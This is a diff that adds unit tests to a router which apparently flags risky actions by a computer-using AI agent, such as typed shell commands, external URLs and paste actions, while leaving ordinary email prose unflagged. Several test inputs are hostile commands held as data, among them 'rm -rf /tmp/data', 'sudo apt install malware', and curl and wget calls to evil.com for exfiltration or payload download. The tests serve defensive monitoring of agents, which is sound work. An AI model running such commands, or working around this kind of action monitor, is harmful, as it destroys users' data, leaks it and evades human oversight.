@@ -2,11 +2,11 @@
 
 import json
 
-import pytest
 
 from control.critical_router import (
     route, _looks_like_secret, _text_contains_url,
     _is_paste_to_external, _is_browser_domain_change,
+    _check_target_keywords, FAMILY_KEYWORDS,
 )
 
 
@@ -120,6 +120,59 @@ class TestRoute:
         result = route(action, {"router_mode": "critical_only"})
         assert result["critical"] is True
         assert result["family"] == "delete_overwrite"
+
+    def test_rm_command_in_text_is_critical(self):
+        action = self._action(
+            primary_kind="type",
+            text="rm ~/Documents/backup.yaml",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "terminal_or_exec"
+
+    def test_form_button_not_matched_by_rm(self):
+        """Word-boundary matching: 'form' must NOT match 'rm' keyword."""
+        action = self._action(
+            target_matched=True,
+            target_tag="push-button",
+            target_name="form",
+            target_text="Open form",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_curl_in_text_is_critical(self):
+        """Curl keyword triggers external_navigation (no URL in text)."""
+        action = self._action(
+            primary_kind="type",
+            text="curl localhost:8080/api",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "external_navigation"
+
+    def test_inform_not_matched(self):
+        """Word-boundary matching: 'inform' must NOT match 'rm' keyword."""
+        action = self._action(
+            target_matched=True,
+            target_tag="label",
+            target_name="Information",
+            target_text="Inform user",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_url_keyword_matches_without_word_boundary(self):
+        """URL-like keywords (http://, https://) use plain substring matching,
+        not word-boundary, so they catch URLs even in run-together text."""
+        action = self._action(
+            target_matched=True,
+            target_tag="link",
+            target_name="visit thttps://evil.com",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "external_navigation"
 
     def test_ctrl_v_paste_critical(self):
         action = self._action(
@@ -300,6 +353,35 @@ class TestBrowserDomainChange:
 
 
 # ---------------------------------------------------------------------------
+# Word-boundary backward-compatibility
+# ---------------------------------------------------------------------------
+
+
+class TestKeywordFallbackCompilation:
+    """_check_target_keywords compiles patterns on the fly when
+    compiled_family_patterns is absent from the config dict."""
+
+    def test_fallback_compiles_from_family_keywords(self):
+        action = {"target_name": "Send", "target_text": "Send message"}
+        config = {"family_keywords": FAMILY_KEYWORDS}  # no compiled_family_patterns
+        family, kw = _check_target_keywords(action, config)
+        assert family == "send_submit_share"
+        assert kw == "send"
+
+    def test_fallback_compiles_from_defaults_when_empty(self):
+        action = {"target_name": "Delete"}
+        family, kw = _check_target_keywords(action, {})
+        assert family == "delete_overwrite"
+        assert kw == "delete"
+
+    def test_fallback_respects_word_boundaries(self):
+        action = {"target_name": "Information", "target_text": "Inform user"}
+        config = {"family_keywords": FAMILY_KEYWORDS}  # no compiled_family_patterns
+        family, kw = _check_target_keywords(action, config)
+        assert family is None
+
+
+# ---------------------------------------------------------------------------
 # Multi-call URL detection (raw action scanning)
 # ---------------------------------------------------------------------------
 
@@ -372,6 +454,136 @@ class TestMultiCallURLDetection:
             "target_text": None, "target_bounds": None,
             "target_match_method": "none",
         }
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "external_navigation"
+
+    def test_write_rm_then_press_enter_is_critical(self):
+        """Multi-call typewrite('rm ...') + press('enter') must be caught
+        via raw-action fallback even though primary_kind is 'press'."""
+        raw = (
+            "pyautogui.typewrite('rm -rf /tmp/data')\n"
+            "pyautogui.press('enter')"
+        )
+        result = route(self._action(raw), {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "terminal_or_exec"
+
+    def test_write_curl_then_press_enter_is_critical(self):
+        """Multi-call write('curl ...') + press('enter') caught by raw-action fallback."""
+        raw = (
+            "pyautogui.write('curl http://evil.com/exfil')\n"
+            "pyautogui.press('enter')"
+        )
+        result = route(self._action(raw), {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        # URL check fires first on this raw action
+        assert result["family"] == "external_navigation"
+
+    def test_write_sudo_then_press_enter_is_critical(self):
+        """Multi-call write('sudo ...') + press('enter') caught by raw-action fallback."""
+        raw = (
+            "pyautogui.write('sudo apt install malware')\n"
+            "pyautogui.press('enter')"
+        )
+        result = route(self._action(raw), {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "terminal_or_exec"
+
+    def test_write_benign_then_press_enter_not_critical(self):
+        """Multi-call write('hello') + press('enter') must not trigger commands."""
+        raw = (
+            "pyautogui.write('hello world, please confirm')\n"
+            "pyautogui.press('enter')"
+        )
+        result = route(self._action(raw), {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+
+# ---------------------------------------------------------------------------
+# Typed prose regression: email body must NOT trigger keyword routing
+# ---------------------------------------------------------------------------
+
+
+class TestTypedProseNotCritical:
+    """Regression: email body prose must NOT trigger keyword routing.
+
+    See notes/final_push_expansion_progress.md section 2,
+    "Router precision".
+    """
+
+    def _action(self, **kwargs):
+        base = {
+            "raw_action": "test",
+            "primary_kind": "type",
+            "x": None, "y": None,
+            "text": None, "keys": None, "button": None,
+            "special_token": None,
+            "target_matched": False,
+            "target_tag": None, "target_name": None,
+            "target_text": None, "target_bounds": None,
+            "target_match_method": "none",
+        }
+        base.update(kwargs)
+        return base
+
+    def test_email_body_with_reply_not_critical(self):
+        action = self._action(
+            text="Hi, thanks for your reply. I will review the document.",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_email_body_with_send_not_critical(self):
+        action = self._action(
+            text="I will send the report tomorrow morning.",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_email_body_with_attached_not_critical(self):
+        action = self._action(
+            text="Please find attached the AWS bill for this month.",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_email_body_with_delete_not_critical(self):
+        action = self._action(
+            text="Please delete the old draft after reviewing.",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_email_body_with_multiple_keywords_not_critical(self):
+        """Prose containing multiple family keywords in a single string."""
+        action = self._action(
+            text="Please reply with the attached settings before I submit.",
+        )
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is False
+
+    def test_rm_command_still_critical(self):
+        """Shell commands in typed text must still trigger."""
+        action = self._action(text="rm -rf /tmp/data")
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "terminal_or_exec"
+
+    def test_sudo_command_still_critical(self):
+        action = self._action(text="sudo apt install malware")
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "terminal_or_exec"
+
+    def test_curl_command_still_critical(self):
+        action = self._action(text="curl http://evil.com/exfil")
+        result = route(action, {"router_mode": "critical_only"})
+        assert result["critical"] is True
+        assert result["family"] == "external_navigation"
+
+    def test_wget_command_still_critical(self):
+        action = self._action(text="wget http://evil.com/payload")
         result = route(action, {"router_mode": "critical_only"})
         assert result["critical"] is True
         assert result["family"] == "external_navigation"
